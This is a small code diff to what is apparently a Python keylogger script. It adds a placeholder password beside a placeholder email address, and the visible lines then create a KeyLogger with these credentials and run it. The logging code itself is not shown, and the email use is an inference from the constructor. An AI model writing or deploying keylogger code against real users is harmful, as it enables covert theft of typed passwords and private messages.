@@ -118,6 +118,7 @@ class KeyLogger:
 
 
 email_address = "YOUR MAIL"
+password = "YOUR PASSWORD"
 
 keylogger = KeyLogger(10, email_address, password)
 keylogger.run()
